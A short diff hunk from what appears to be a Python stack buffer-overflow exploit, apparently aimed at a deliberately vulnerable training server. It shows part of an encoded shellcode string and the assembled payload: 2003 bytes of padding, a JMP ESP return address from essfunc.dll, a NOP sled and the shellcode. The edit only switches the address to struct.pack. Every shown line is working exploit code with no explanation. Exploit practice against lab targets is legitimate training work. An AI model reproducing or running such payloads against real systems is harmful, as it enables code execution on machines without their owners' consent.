@@ -255,7 +255,7 @@ shellcode += "\x57\x24\x6c\xdd\x52\x60\x2a\x0e\x2f\xf9\xdf\x30"
 shellcode += "\x9c\xfa\xf5"
 
 payload  = "A" * 2003 # fill up the buffer after calculating the offset
-payload += "\xAF\x11\x50\x62" # JMP ESP from essfunc.dll 
+payload += struct.pack("<L", 0x625011AF) 
 payload += "\x90" * 16
 payload += shellcode
 
